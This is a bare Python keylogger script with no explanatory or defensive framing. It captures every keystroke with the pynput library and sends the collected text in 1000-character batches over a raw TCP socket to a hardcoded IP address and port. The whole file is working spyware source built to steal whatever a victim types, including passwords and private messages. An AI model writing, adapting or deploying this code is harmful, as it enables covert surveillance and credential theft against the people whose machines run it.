from pynput import keyboard
import socket
import time

text = ""
ip_address = "192.168.155.228"
port_number = 8080

def send_post_req():
    global text
    if len(text) >= 1000:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address,port_number))
        s.send(text.encode())
        s.close()
        text = ""
    time.sleep(1)
    send_post_req()

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
